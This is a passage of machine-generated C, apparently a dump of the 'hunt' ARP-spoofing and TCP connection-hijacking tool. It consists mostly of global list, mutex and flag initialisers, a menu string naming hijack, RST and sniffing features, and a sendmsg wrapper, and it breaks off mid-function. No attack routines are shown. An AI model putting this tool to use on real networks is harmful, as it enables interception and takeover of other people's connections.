static struct list l_arp_spoof = { .l_first=(void *)0, .l_last=(void *)0, .l_off=(signed int)((char *)&((struct arp_spoof_info *)0)->next - (char *)0),
    .l_produce_done=0,
    .l_iter=(struct list_iterator *)(void *)0, .l_locked=0,
    .l_mutex={ .__data={ .__lock=0, .__count=(unsigned int)0, .__owner=0, .__nusers=(unsigned int)0,
    .__kind=0, .__spins=(signed short int)0,
    .__elision=(signed short int)0, .__list={ .__prev=((struct __pthread_internal_list *)NULL), .__next=((struct __pthread_internal_list *)NULL) } } }, .l_notempty={ .__data={ .__lock=0, .__futex=(unsigned int)0, .__total_seq=(unsigned long long int)0, .__wakeup_seq=(unsigned long long int)0,
    .__woken_seq=(unsigned long long int)0,
    .__mutex=(void *)0,
    .__nwaiters=(unsigned int)0, .__broadcast_seq=(unsigned int)0 } },
    .l_locked_thr=(unsigned long int)0 };
// l_arp_spoof_range
// file arpspoof.c line 33
static struct list l_arp_spoof_range = { .l_first=(void *)0, .l_last=(void *)0, .l_off=(signed int)((char *)&((struct arp_spoof_range *)0)->next - (char *)0),
    .l_produce_done=0,
    .l_iter=(struct list_iterator *)(void *)0, .l_locked=0,
    .l_mutex={ .__data={ .__lock=0, .__count=(unsigned int)0, .__owner=0, .__nusers=(unsigned int)0,
    .__kind=0, .__spins=(signed short int)0,
    .__elision=(signed short int)0, .__list={ .__prev=((struct __pthread_internal_list *)NULL), .__next=((struct __pthread_internal_list *)NULL) } } }, .l_notempty={ .__data={ .__lock=0, .__futex=(unsigned int)0, .__total_seq=(unsigned long long int)0, .__wakeup_seq=(unsigned long long int)0,
    .__woken_seq=(unsigned long long int)0,
    .__mutex=(void *)0,
    .__nwaiters=(unsigned int)0, .__broadcast_seq=(unsigned int)0 } },
    .l_locked_thr=(unsigned long int)0 };
// l_arpspoof_test
// file arpspoof.c line 1334
static struct list l_arpspoof_test = { .l_first=(void *)0, .l_last=(void *)0, .l_off=(signed int)((char *)&((struct packet *)0)->p_next[(signed long int)6] - (char *)0),
    .l_produce_done=0,
    .l_iter=(struct list_iterator *)(void *)0, .l_locked=0,
    .l_mutex={ .__data={ .__lock=0, .__count=(unsigned int)0, .__owner=0, .__nusers=(unsigned int)0,
    .__kind=0, .__spins=(signed short int)0,
    .__elision=(signed short int)0, .__list={ .__prev=((struct __pthread_internal_list *)NULL), .__next=((struct __pthread_internal_list *)NULL) } } }, .l_notempty={ .__data={ .__lock=0, .__futex=(unsigned int)0, .__total_seq=(unsigned long long int)0, .__wakeup_seq=(unsigned long long int)0,
    .__woken_seq=(unsigned long long int)0,
    .__mutex=(void *)0,
    .__nwaiters=(unsigned int)0, .__broadcast_seq=(unsigned int)0 } },
    .l_locked_thr=(unsigned long int)0 };
// l_dump_connection
// file main.c line 76
struct list l_dump_connection = { .l_first=(void *)0, .l_last=(void *)0, .l_off=(signed int)((char *)&((struct packet *)0)->p_next[(signed long int)0] - (char *)0),
    .l_produce_done=0,
    .l_iter=(struct list_iterator *)(void *)0, .l_locked=0,
    .l_mutex={ .__data={ .__lock=0, .__count=(unsigned int)0, .__owner=0, .__nusers=(unsigned int)0,
    .__kind=0, .__spins=(signed short int)0,
    .__elision=(signed short int)0, .__list={ .__prev=((struct __pthread_internal_list *)NULL), .__next=((struct __pthread_internal_list *)NULL) } } }, .l_notempty={ .__data={ .__lock=0, .__futex=(unsigned int)0, .__total_seq=(unsigned long long int)0, .__wakeup_seq=(unsigned long long int)0,
    .__woken_seq=(unsigned long long int)0,
    .__mutex=(void *)0,
    .__nwaiters=(unsigned int)0, .__broadcast_seq=(unsigned int)0 } },
    .l_locked_thr=(unsigned long int)0 };
// l_hijack_conn
// file hijack.c line 42
struct list l_hijack_conn = { .l_first=(void *)0, .l_last=(void *)0, .l_off=(signed int)((char *)&((struct packet *)0)->p_next[(signed long int)1] - (char *)0),
    .l_produce_done=0,
    .l_iter=(struct list_iterator *)(void *)0, .l_locked=0,
    .l_mutex={ .__data={ .__lock=0, .__count=(unsigned int)0, .__owner=0, .__nusers=(unsigned int)0,
    .__kind=0, .__spins=(signed short int)0,
    .__elision=(signed short int)0, .__list={ .__prev=((struct __pthread_internal_list *)NULL), .__next=((struct __pthread_internal_list *)NULL) } } }, .l_notempty={ .__data={ .__lock=0, .__futex=(unsigned int)0, .__total_seq=(unsigned long long int)0, .__wakeup_seq=(unsigned long long int)0,
    .__woken_seq=(unsigned long long int)0,
    .__mutex=(void *)0,
    .__nwaiters=(unsigned int)0, .__broadcast_seq=(unsigned int)0 } },
    .l_locked_thr=(unsigned long int)0 };
// l_icmp_packet
// file hostup.c line 21
static struct list l_icmp_packet = { .l_first=(void *)0, .l_last=(void *)0, .l_off=(signed int)((char *)&((struct packet *)0)->p_next[(signed long int)5] - (char *)0),
    .l_produce_done=0,
    .l_iter=(struct list_iterator *)(void *)0, .l_locked=0,
    .l_mutex={ .__data={ .__lock=0, .__count=(unsigned int)0, .__owner=0, .__nusers=(unsigned int)0,
    .__kind=0, .__spins=(signed short int)0,
    .__elision=(signed short int)0, .__list={ .__prev=((struct __pthread_internal_list *)NULL), .__next=((struct __pthread_internal_list *)NULL) } } }, .l_notempty={ .__data={ .__lock=0, .__futex=(unsigned int)0, .__total_seq=(unsigned long long int)0, .__wakeup_seq=(unsigned long long int)0,
    .__woken_seq=(unsigned long long int)0,
    .__mutex=(void *)0,
    .__nwaiters=(unsigned int)0, .__broadcast_seq=(unsigned int)0 } },
    .l_locked_thr=(unsigned long int)0 };
// l_ifunc_arp
// file hunt.c line 54
struct list l_ifunc_arp = { .l_first=(void *)0, .l_last=(void *)0, .l_off=(signed int)((char *)&((struct ifunc_item *)0)->next_arp - (char *)0),
    .l_produce_done=0,
    .l_iter=(struct list_iterator *)(void *)0, .l_locked=0,
    .l_mutex={ .__data={ .__lock=0, .__count=(unsigned int)0, .__owner=0, .__nusers=(unsigned int)0,
    .__kind=0, .__spins=(signed short int)0,
    .__elision=(signed short int)0, .__list={ .__prev=((struct __pthread_internal_list *)NULL), .__next=((struct __pthread_internal_list *)NULL) } } }, .l_notempty={ .__data={ .__lock=0, .__futex=(unsigned int)0, .__total_seq=(unsigned long long int)0, .__wakeup_seq=(unsigned long long int)0,
    .__woken_seq=(unsigned long long int)0,
    .__mutex=(void *)0,
    .__nwaiters=(unsigned int)0, .__broadcast_seq=(unsigned int)0 } },
    .l_locked_thr=(unsigned long int)0 };
// l_ifunc_fast_tcp
// file hunt.c line 55
struct list l_ifunc_fast_tcp = { .l_first=(void *)0, .l_last=(void *)0, .l_off=(signed int)((char *)&((struct ifunc_item *)0)->next_tcp - (char *)0),
    .l_produce_done=0,
    .l_iter=(struct list_iterator *)(void *)0, .l_locked=0,
    .l_mutex={ .__data={ .__lock=0, .__count=(unsigned int)0, .__owner=0, .__nusers=(unsigned int)0,
    .__kind=0, .__spins=(signed short int)0,
    .__elision=(signed short int)0, .__list={ .__prev=((struct __pthread_internal_list *)NULL), .__next=((struct __pthread_internal_list *)NULL) } } }, .l_notempty={ .__data={ .__lock=0, .__futex=(unsigned int)0, .__total_seq=(unsigned long long int)0, .__wakeup_seq=(unsigned long long int)0,
    .__woken_seq=(unsigned long long int)0,
    .__mutex=(void *)0,
    .__nwaiters=(unsigned int)0, .__broadcast_seq=(unsigned int)0 } },
    .l_locked_thr=(unsigned long int)0 };
// l_ifunc_icmp
// file hunt.c line 53
struct list l_ifunc_icmp = { .l_first=(void *)0, .l_last=(void *)0, .l_off=(signed int)((char *)&((struct ifunc_item *)0)->next_icmp - (char *)0),
    .l_produce_done=0,
    .l_iter=(struct list_iterator *)(void *)0, .l_locked=0,
    .l_mutex={ .__data={ .__lock=0, .__count=(unsigned int)0, .__owner=0, .__nusers=(unsigned int)0,
    .__kind=0, .__spins=(signed short int)0,
    .__elision=(signed short int)0, .__list={ .__prev=((struct __pthread_internal_list *)NULL), .__next=((struct __pthread_internal_list *)NULL) } } }, .l_notempty={ .__data={ .__lock=0, .__futex=(unsigned int)0, .__total_seq=(unsigned long long int)0, .__wakeup_seq=(unsigned long long int)0,
    .__woken_seq=(unsigned long long int)0,
    .__mutex=(void *)0,
    .__nwaiters=(unsigned int)0, .__broadcast_seq=(unsigned int)0 } },
    .l_locked_thr=(unsigned long int)0 };
// l_ifunc_ip
// file hunt.c line 50
struct list l_ifunc_ip = { .l_first=(void *)0, .l_last=(void *)0, .l_off=(signed int)((char *)&((struct ifunc_item *)0)->next_ip - (char *)0),
    .l_produce_done=0,
    .l_iter=(struct list_iterator *)(void *)0, .l_locked=0,
    .l_mutex={ .__data={ .__lock=0, .__count=(unsigned int)0, .__owner=0, .__nusers=(unsigned int)0,
    .__kind=0, .__spins=(signed short int)0,
    .__elision=(signed short int)0, .__list={ .__prev=((struct __pthread_internal_list *)NULL), .__next=((struct __pthread_internal_list *)NULL) } } }, .l_notempty={ .__data={ .__lock=0, .__futex=(unsigned int)0, .__total_seq=(unsigned long long int)0, .__wakeup_seq=(unsigned long long int)0,
    .__woken_seq=(unsigned long long int)0,
    .__mutex=(void *)0,
    .__nwaiters=(unsigned int)0, .__broadcast_seq=(unsigned int)0 } },
    .l_locked_thr=(unsigned long int)0 };
// l_ifunc_tcp
// file hunt.c line 51
struct list l_ifunc_tcp = { .l_first=(void *)0, .l_last=(void *)0, .l_off=(signed int)((char *)&((struct ifunc_item *)0)->next_tcp - (char *)0),
    .l_produce_done=0,
    .l_iter=(struct list_iterator *)(void *)0, .l_locked=0,
    .l_mutex={ .__data={ .__lock=0, .__count=(unsigned int)0, .__owner=0, .__nusers=(unsigned int)0,
    .__kind=0, .__spins=(signed short int)0,
    .__elision=(signed short int)0, .__list={ .__prev=((struct __pthread_internal_list *)NULL), .__next=((struct __pthread_internal_list *)NULL) } } }, .l_notempty={ .__data={ .__lock=0, .__futex=(unsigned int)0, .__total_seq=(unsigned long long int)0, .__wakeup_seq=(unsigned long long int)0,
    .__woken_seq=(unsigned long long int)0,
    .__mutex=(void *)0,
    .__nwaiters=(unsigned int)0, .__broadcast_seq=(unsigned int)0 } },
    .l_locked_thr=(unsigned long int)0 };
// l_ifunc_udp
// file hunt.c line 52
struct list l_ifunc_udp = { .l_first=(void *)0, .l_last=(void *)0, .l_off=(signed int)((char *)&((struct ifunc_item *)0)->next_udp - (char *)0),
    .l_produce_done=0,
    .l_iter=(struct list_iterator *)(void *)0, .l_locked=0,
    .l_mutex={ .__data={ .__lock=0, .__count=(unsigned int)0, .__owner=0, .__nusers=(unsigned int)0,
    .__kind=0, .__spins=(signed short int)0,
    .__elision=(signed short int)0, .__list={ .__prev=((struct __pthread_internal_list *)NULL), .__next=((struct __pthread_internal_list *)NULL) } } }, .l_notempty={ .__data={ .__lock=0, .__futex=(unsigned int)0, .__total_seq=(unsigned long long int)0, .__wakeup_seq=(unsigned long long int)0,
    .__woken_seq=(unsigned long long int)0,
    .__mutex=(void *)0,
    .__nwaiters=(unsigned int)0, .__broadcast_seq=(unsigned int)0 } },
    .l_locked_thr=(unsigned long int)0 };
// l_mdi
// file macdisc.c line 71
static struct list l_mdi = { .l_first=(void *)0, .l_last=(void *)0, .l_off=(signed int)((char *)&((struct mac_disc_info *)0)->next - (char *)0),
    .l_produce_done=0,
    .l_iter=(struct list_iterator *)(void *)0, .l_locked=0,
    .l_mutex={ .__data={ .__lock=0, .__count=(unsigned int)0, .__owner=0, .__nusers=(unsigned int)0,
    .__kind=0, .__spins=(signed short int)0,
    .__elision=(signed short int)0, .__list={ .__prev=((struct __pthread_internal_list *)NULL), .__next=((struct __pthread_internal_list *)NULL) } } }, .l_notempty={ .__data={ .__lock=0, .__futex=(unsigned int)0, .__total_seq=(unsigned long long int)0, .__wakeup_seq=(unsigned long long int)0,
    .__woken_seq=(unsigned long long int)0,
    .__mutex=(void *)0,
    .__nwaiters=(unsigned int)0, .__broadcast_seq=(unsigned int)0 } },
    .l_locked_thr=(unsigned long int)0 };
// l_packets
// file hunt.c line 63
static struct list l_packets = { .l_first=(void *)0, .l_last=(void *)0, .l_off=(signed int)((char *)&((struct packet *)0)->p_next_free - (char *)0),
    .l_produce_done=0,
    .l_iter=(struct list_iterator *)(void *)0, .l_locked=0,
    .l_mutex={ .__data={ .__lock=0, .__count=(unsigned int)0, .__owner=0, .__nusers=(unsigned int)0,
    .__kind=0, .__spins=(signed short int)0,
    .__elision=(signed short int)0, .__list={ .__prev=((struct __pthread_internal_list *)NULL), .__next=((struct __pthread_internal_list *)NULL) } } }, .l_notempty={ .__data={ .__lock=0, .__futex=(unsigned int)0, .__total_seq=(unsigned long long int)0, .__wakeup_seq=(unsigned long long int)0,
    .__woken_seq=(unsigned long long int)0,
    .__mutex=(void *)0,
    .__nwaiters=(unsigned int)0, .__broadcast_seq=(unsigned int)0 } },
    .l_locked_thr=(unsigned long int)0 };
// l_relay_db
// file pktrelay.c line 53
static struct list l_relay_db = { .l_first=(void *)0, .l_last=(void *)0, .l_off=(signed int)((char *)&((struct relay_item *)0)->next - (char *)0),
    .l_produce_done=0,
    .l_iter=(struct list_iterator *)(void *)0, .l_locked=0,
    .l_mutex={ .__data={ .__lock=0, .__count=(unsigned int)0, .__owner=0, .__nusers=(unsigned int)0,
    .__kind=0, .__spins=(signed short int)0,
    .__elision=(signed short int)0, .__list={ .__prev=((struct __pthread_internal_list *)NULL), .__next=((struct __pthread_internal_list *)NULL) } } }, .l_notempty={ .__data={ .__lock=0, .__futex=(unsigned int)0, .__total_seq=(unsigned long long int)0, .__wakeup_seq=(unsigned long long int)0,
    .__woken_seq=(unsigned long long int)0,
    .__mutex=(void *)0,
    .__nwaiters=(unsigned int)0, .__broadcast_seq=(unsigned int)0 } },
    .l_locked_thr=(unsigned long int)0 };
// l_relay_pkt
// file arpspoof.c line 38
static struct list l_relay_pkt = { .l_first=(void *)0, .l_last=(void *)0, .l_off=(signed int)((char *)&((struct packet *)0)->p_next[(signed long int)3] - (char *)0),
    .l_produce_done=0,
    .l_iter=(struct list_iterator *)(void *)0, .l_locked=0,
    .l_mutex={ .__data={ .__lock=0, .__count=(unsigned int)0, .__owner=0, .__nusers=(unsigned int)0,
    .__kind=0, .__spins=(signed short int)0,
    .__elision=(signed short int)0, .__list={ .__prev=((struct __pthread_internal_list *)NULL), .__next=((struct __pthread_internal_list *)NULL) } } }, .l_notempty={ .__data={ .__lock=0, .__futex=(unsigned int)0, .__total_seq=(unsigned long long int)0, .__wakeup_seq=(unsigned long long int)0,
    .__woken_seq=(unsigned long long int)0,
    .__mutex=(void *)0,
    .__nwaiters=(unsigned int)0, .__broadcast_seq=(unsigned int)0 } },
    .l_locked_thr=(unsigned long int)0 };
// l_rst_db
// file rstd.c line 36
static struct list l_rst_db = { .l_first=(void *)0, .l_last=(void *)0, .l_off=(signed int)((char *)&((struct rst_db_item *)0)->next - (char *)0),
    .l_produce_done=0,
    .l_iter=(struct list_iterator *)(void *)0, .l_locked=0,
    .l_mutex={ .__data={ .__lock=0, .__count=(unsigned int)0, .__owner=0, .__nusers=(unsigned int)0,
    .__kind=0, .__spins=(signed short int)0,
    .__elision=(signed short int)0, .__list={ .__prev=((struct __pthread_internal_list *)NULL), .__next=((struct __pthread_internal_list *)NULL) } } }, .l_notempty={ .__data={ .__lock=0, .__futex=(unsigned int)0, .__total_seq=(unsigned long long int)0, .__wakeup_seq=(unsigned long long int)0,
    .__woken_seq=(unsigned long long int)0,
    .__mutex=(void *)0,
    .__nwaiters=(unsigned int)0, .__broadcast_seq=(unsigned int)0 } },
    .l_locked_thr=(unsigned long int)0 };
// l_rst_packet
// file rstd.c line 31
static struct list l_rst_packet = { .l_first=(void *)0, .l_last=(void *)0, .l_off=(signed int)((char *)&((struct packet *)0)->p_next[(signed long int)2] - (char *)0),
    .l_produce_done=0,
    .l_iter=(struct list_iterator *)(void *)0, .l_locked=0,
    .l_mutex={ .__data={ .__lock=0, .__count=(unsigned int)0, .__owner=0, .__nusers=(unsigned int)0,
    .__kind=0, .__spins=(signed short int)0,
    .__elision=(signed short int)0, .__list={ .__prev=((struct __pthread_internal_list *)NULL), .__next=((struct __pthread_internal_list *)NULL) } } }, .l_notempty={ .__data={ .__lock=0, .__futex=(unsigned int)0, .__total_seq=(unsigned long long int)0, .__wakeup_seq=(unsigned long long int)0,
    .__woken_seq=(unsigned long long int)0,
    .__mutex=(void *)0,
    .__nwaiters=(unsigned int)0, .__broadcast_seq=(unsigned int)0 } },
    .l_locked_thr=(unsigned long int)0 };
// l_skip_update
// file hunt.c line 45
struct list l_skip_update = { .l_first=(void *)0, .l_last=(void *)0, .l_off=(signed int)((char *)&((struct packet_info *)0)->next - (char *)0),
    .l_produce_done=0,
    .l_iter=(struct list_iterator *)(void *)0, .l_locked=0,
    .l_mutex={ .__data={ .__lock=0, .__count=(unsigned int)0, .__owner=0, .__nusers=(unsigned int)0,
    .__kind=0, .__spins=(signed short int)0,
    .__elision=(signed short int)0, .__list={ .__prev=((struct __pthread_internal_list *)NULL), .__next=((struct __pthread_internal_list *)NULL) } } }, .l_notempty={ .__data={ .__lock=0, .__futex=(unsigned int)0, .__total_seq=(unsigned long long int)0, .__wakeup_seq=(unsigned long long int)0,
    .__woken_seq=(unsigned long long int)0,
    .__mutex=(void *)0,
    .__nwaiters=(unsigned int)0, .__broadcast_seq=(unsigned int)0 } },
    .l_locked_thr=(unsigned long int)0 };
// l_sniff_db
// file sniff.c line 66
static struct list l_sniff_db = { .l_first=(void *)0, .l_last=(void *)0, .l_off=(signed int)((char *)&((struct sniff_log *)0)->next - (char *)0),
    .l_produce_done=0,
    .l_iter=(struct list_iterator *)(void *)0, .l_locked=0,
    .l_mutex={ .__data={ .__lock=0, .__count=(unsigned int)0, .__owner=0, .__nusers=(unsigned int)0,
    .__kind=0, .__spins=(signed short int)0,
    .__elision=(signed short int)0, .__list={ .__prev=((struct __pthread_internal_list *)NULL), .__next=((struct __pthread_internal_list *)NULL) } } }, .l_notempty={ .__data={ .__lock=0, .__futex=(unsigned int)0, .__total_seq=(unsigned long long int)0, .__wakeup_seq=(unsigned long long int)0,
    .__woken_seq=(unsigned long long int)0,
    .__mutex=(void *)0,
    .__nwaiters=(unsigned int)0, .__broadcast_seq=(unsigned int)0 } },
    .l_locked_thr=(unsigned long int)0 };
// l_sniff_pkt
// file sniff.c line 64
static struct list l_sniff_pkt = { .l_first=(void *)0, .l_last=(void *)0, .l_off=(signed int)((char *)&((struct packet *)0)->p_next[(signed long int)4] - (char *)0),
    .l_produce_done=0,
    .l_iter=(struct list_iterator *)(void *)0, .l_locked=0,
    .l_mutex={ .__data={ .__lock=0, .__count=(unsigned int)0, .__owner=0, .__nusers=(unsigned int)0,
    .__kind=0, .__spins=(signed short int)0,
    .__elision=(signed short int)0, .__list={ .__prev=((struct __pthread_internal_list *)NULL), .__next=((struct __pthread_internal_list *)NULL) } } }, .l_notempty={ .__data={ .__lock=0, .__futex=(unsigned int)0, .__total_seq=(unsigned long long int)0, .__wakeup_seq=(unsigned long long int)0,
    .__woken_seq=(unsigned long long int)0,
    .__mutex=(void *)0,
    .__nwaiters=(unsigned int)0, .__broadcast_seq=(unsigned int)0 } },
    .l_locked_thr=(unsigned long int)0 };
// lines_o
// file options.c line 15
signed int lines_o = 1000000;
// linksock
// file hunt.c line 28
signed int linksock = -1;
// loop_running
// file main.c line 100
volatile signed int loop_running;
// mac_broadcast
// file arpspoof.c line 47
unsigned char mac_broadcast[6l] = { (unsigned char)0xFF, (unsigned char)0xFF, (unsigned char)0xFF, (unsigned char)0xFF, (unsigned char)0xFF, (unsigned char)0xFF };
// mac_learn_from_ip
// file hunt.c line 29
signed int mac_learn_from_ip = 0;
// mac_table
// file hunt.c line 35
struct hash mac_table;
// mac_thr
// file macdisc.c line 76
static unsigned long int mac_thr;
// mac_zero
// file arpspoof.c line 48
unsigned char mac_zero[6l] = { (unsigned char)0x00, (unsigned char)0x00, (unsigned char)0x00, (unsigned char)0x00, (unsigned char)0x00, (unsigned char)0x00 };
// main_menu
// file main.c line 424
char *main_menu = "l/w/r) list/watch/reset connections\nu)     host up tests\na)     arp/simple hijack (avoids ack storm if arp used)\ns)     simple hijack\nd)     daemons rst/arp/sniff/mac\no)     options\nx)     exit\n";
// main_menu_opt
// file main.c line 431
char *main_menu_opt = "lwrusadox";
// main_thread_id
// file main.c line 450
unsigned long int main_thread_id = (unsigned long int)0;
// menucc_conn_ind
// file menu.c line 356
static signed int menucc_conn_ind = 0;
// menucc_conn_s
// file menu.c line 360
static signed int menucc_conn_s = 0;
// menucc_conn_s_old
// file menu.c line 361
static signed int menucc_conn_s_old = 0;
// menucc_dfl
// file menu.c line 359
static char menucc_dfl;
// menucc_in_menu
// file menu.c line 355
static signed int menucc_in_menu = 0;
// menucc_label
// file menu.c line 357
static char *menucc_label;
// menucc_mutex
// file menu.c line 354
static union anonymous_2 menucc_mutex = { .__data={ .__lock=0, .__count=(unsigned int)0, .__owner=0, .__nusers=(unsigned int)0,
    .__kind=0, .__spins=(signed short int)0,
    .__elision=(signed short int)0, .__list={ .__prev=((struct __pthread_internal_list *)NULL), .__next=((struct __pthread_internal_list *)NULL) } } };
// menucc_opt
// file menu.c line 358
static char *menucc_opt;
// mutex_hunt_ready
// file hunt.c line 38
union anonymous_2 mutex_hunt_ready = { .__data={ .__lock=0, .__count=(unsigned int)0, .__owner=0, .__nusers=(unsigned int)0,
    .__kind=0, .__spins=(signed short int)0,
    .__elision=(signed short int)0, .__list={ .__prev=((struct __pthread_internal_list *)NULL), .__next=((struct __pthread_internal_list *)NULL) } } };
// mutex_stop
// file macdisc.c line 78
static union anonymous_2 mutex_stop = { .__data={ .__lock=0, .__count=(unsigned int)0, .__owner=0, .__nusers=(unsigned int)0,
    .__kind=0, .__spins=(signed short int)0,
    .__elision=(signed short int)0, .__list={ .__prev=((struct __pthread_internal_list *)NULL), .__next=((struct __pthread_internal_list *)NULL) } } };
// my_eth_ip
// file tap.c line 37
unsigned int my_eth_ip;
// my_eth_mac
// file tap.c line 36
unsigned char my_eth_mac[6l];
// need_read
// file synchijack.c line 118
volatile signed int need_read;
// need_read_want_n
// file synchijack.c line 187
static signed int need_read_want_n = 0;
// need_write
// file synchijack.c line 118
volatile signed int need_write;
// need_write_want_n
// file synchijack.c line 188
static signed int need_write_want_n = 0;
// nw_was_negative
// file synchijack.c line 121
signed int nw_was_negative;
// o_newline
// file sniff.c line 21
signed int o_newline = 0;
// optarg
// file /usr/include/getopt.h line 57
extern char *optarg;
// packets_allocated
// file hunt.c line 64
signed int packets_allocated = 0;
// pid_parent
// file resolv.c line 48
static signed int pid_parent = 0;
// pid_req
// file resolv.c line 47
static signed int pid_req = 0;
// pkts_dropped
// file hunt.c line 724
unsigned int pkts_dropped = (unsigned int)0;
// pkts_received
// file hunt.c line 723
unsigned int pkts_received = (unsigned int)0;
// pkts_unhandled
// file hunt.c line 725
unsigned int pkts_unhandled = (unsigned int)0;
// print_cntrl_chars
// file options.c line 178
signed int print_cntrl_chars = 1;
// relay_thr
// file arpspoof.c line 36
static unsigned long int relay_thr;
// relayer_running
// file arpspoof.c line 39
static signed int relayer_running = 0;
// resolv_daemon_run
// file resolv.c line 234
static volatile signed int resolv_daemon_run;
// resolv_slave_run
// file resolv.c line 172
static volatile signed int resolv_slave_run;
// rstd_running
// file rstd.c line 35
static signed int rstd_running = 0;
// rstd_thr
// file rstd.c line 34
static unsigned long int rstd_thr;
// run_arpspoof
// file arpspoof.c line 1434
static volatile signed int run_arpspoof;
// save_termios
// file tty.c line 14
static struct termios save_termios;
// sniff_thr
// file sniff.c line 65
static unsigned long int sniff_thr;
// sniffer_running
// file sniff.c line 63
static signed int sniffer_running = 0;
// stderr
// file /usr/include/stdio.h line 170
extern struct _IO_FILE *stderr;
// stdin
// file /usr/include/stdio.h line 168
extern struct _IO_FILE *stdin;
// stdout
// file /usr/include/stdio.h line 169
extern struct _IO_FILE *stdout;
// stop
// file macdisc.c line 77
static volatile signed int stop = 0;
// stop_break
// file macdisc.c line 74
static volatile signed int stop_break = 0;
// storm_reset_sec
// file hijack.c line 199
signed int storm_reset_sec = 4;
// stormack_hijack_wait_sec
// file hijack.c line 200
signed int stormack_hijack_wait_sec = 2;
// sync_was_canceled
// file synchijack.c line 119
volatile signed int sync_was_canceled;
// th_hunt
// file main.c line 449
unsigned long int th_hunt = (unsigned long int)0;
// thr_running
// file macdisc.c line 75
static signed int thr_running = 0;
// timejob_cond
// file timer.c line 18
union anonymous_4 timejob_cond = { .__data={ .__lock=0, .__futex=(unsigned int)0, .__total_seq=(unsigned long long int)0, .__wakeup_seq=(unsigned long long int)0,
    .__woken_seq=(unsigned long long int)0,
    .__mutex=(void *)0,
    .__nwaiters=(unsigned int)0, .__broadcast_seq=(unsigned int)0 } };
// timejob_curr
// file timer.c line 22
struct timejob *timejob_curr = (struct timejob *)(void *)0;
// timejob_curr_cond
// file timer.c line 19
union anonymous_4 timejob_curr_cond = { .__data={ .__lock=0, .__futex=(unsigned int)0, .__total_seq=(unsigned long long int)0, .__wakeup_seq=(unsigned long long int)0,
    .__woken_seq=(unsigned long long int)0,
    .__mutex=(void *)0,
    .__nwaiters=(unsigned int)0, .__broadcast_seq=(unsigned int)0 } };
// timejob_list
// file timer.c line 13
struct list timejob_list = { .l_first=(void *)0, .l_last=(void *)0, .l_off=(signed int)((char *)&((struct timejob *)0)->j_next - (char *)0),
    .l_produce_done=0,
    .l_iter=(struct list_iterator *)(void *)0, .l_locked=0,
    .l_mutex={ .__data={ .__lock=0, .__count=(unsigned int)0, .__owner=0, .__nusers=(unsigned int)0,
    .__kind=0, .__spins=(signed short int)0,
    .__elision=(signed short int)0, .__list={ .__prev=((struct __pthread_internal_list *)NULL), .__next=((struct __pthread_internal_list *)NULL) } } }, .l_notempty={ .__data={ .__lock=0, .__futex=(unsigned int)0, .__total_seq=(unsigned long long int)0, .__wakeup_seq=(unsigned long long int)0,
    .__woken_seq=(unsigned long long int)0,
    .__mutex=(void *)0,
    .__nwaiters=(unsigned int)0, .__broadcast_seq=(unsigned int)0 } },
    .l_locked_thr=(unsigned long int)0 };
// timejob_mutex
// file timer.c line 17
union anonymous_2 timejob_mutex = { .__data={ .__lock=0, .__count=(unsigned int)0, .__owner=0, .__nusers=(unsigned int)0,
    .__kind=0, .__spins=(signed short int)0,
    .__elision=(signed short int)0, .__list={ .__prev=((struct __pthread_internal_list *)NULL), .__next=((struct __pthread_internal_list *)NULL) } } };
// timejob_run
// file timer.c line 23
signed int timejob_run = 1;
// timejob_run_cond
// file timer.c line 20
union anonymous_4 timejob_run_cond = { .__data={ .__lock=0, .__futex=(unsigned int)0, .__total_seq=(unsigned long long int)0, .__wakeup_seq=(unsigned long long int)0,
    .__woken_seq=(unsigned long long int)0,
    .__mutex=(void *)0,
    .__nwaiters=(unsigned int)0, .__broadcast_seq=(unsigned int)0 } };
// timejob_thr
// file timer.c line 15
unsigned long int timejob_thr;
// ttysavefd
// file tty.c line 15
static signed int ttysavefd = -1;
// ttystate
// file tty.c line 16
static enum anonymous_10 ttystate = (enum anonymous_10)RESET;
// verbose
// file main.c line 451
signed int verbose = 0;
// wait_sec
// file macdisc.c line 73
static signed int wait_sec = 300;

// Sendmsg
// file net.c line 17
signed int Sendmsg(signed int s, struct msghdr *msg, unsigned int flags)
{
  signed int retval;
  signed int retry_count = 0;
  struct timespec ts;
  signed long int return_value_sendmsg_1;
  signed int *return_value___errno_location_2;
  do
  {

  retry:
    ;
    return_value_sendmsg_1=sendmsg(s, msg, (signed int)flags);
    retval = (signed int)return_value_sendmsg_1;
    if(retval >= 0)
      break;

    return_value___errno_location_2=__errno_location();
    if(!(*return_value___errno_location_2 == 105))
      break;

    if(retry_count >= 5)
      break;

    ts.tv_sec = (signed long int)0;
    ts.tv_nsec = (signed long int)10000000;
    nanosleep(&ts, (struct timespec *)(void *)0);
    retry_count = retry_count + 1;
  }
  while((_Bool)1);
  signed int *return_value___errno_location_3;
  if(!(retval >= 0))
  {
    return_value___errno_location_3=__errno_location();
    fprintf(stderr, "sendmsg retval = %d errno = %d\n", retval, *return_value___errno_location_3);
  }

  return retval;
}

// __bswap_32
// file /usr/include/x86_64-linux-gnu/bits/byteswap.h line 45
static inline unsigned int __bswap_32(unsigned int __bsx)
{
  signed long int return_value___builtin_bswap32_1;
  return_value___builtin_bswap32_1=__builtin_bswap32((signed long int)__bsx);
  return (unsigned int)return_value___builtin_bswap32_1;
}

// __bswap_32_link1
// file /usr/include/x86_64-linux-gnu/bits/byteswap.h line 45
static inline unsigned int __bswap_32_link1(unsigned int __bsx_link1)
{
  signed long int return_value___builtin_bswap32_1_link1;
  return_value___builtin_bswap32_1_link1=__builtin_bswap32((signed long int)__bsx_link1);
  return (unsigned int)return_value___builtin_bswap32_1_link1;
}

// __bswap_32_link2
// file /usr/include/x86_64-linux-gnu/bits/byteswap.h line 45
static inline unsigned int __bswap_32_link2(unsigned int __bsx_link2)
{
  signed long int return_value___builtin_bswap32_1_link2;
  return_value___builtin_bswap32_1_link2=__builtin_bswap32((signed long int)__bsx_link2);
  return (unsigned int)return_value___builtin_bswap32_1_link2;
}

// __bswap_32_link3
// file /usr/include/x86_64-linux-gnu/bits/byteswap.h line 45
static inline unsigned int __bswap_32_link3(unsigned int __bsx_link3)
{
  signed long int return_value___builtin_bswap32_1_link3;
  return_value___builtin_bswap32_1_link3=__builtin_bswap32((signed long int)__bsx_link3);
  return (unsigned int)return_value___builtin_bswap32_1_link3;
}

// __bswap_32_link4
// file /usr/include/x86_64-linux-gnu/bits/byteswap.h line 45
static inline unsigned int __bswap_32_link4(unsigned int __bsx_link4)
{
  signed long int return_value___builtin_bswap32_1_link4;
  return_value___builtin_bswap32_1_link4=__builtin_bswap32((signed long int)__bsx_link4);
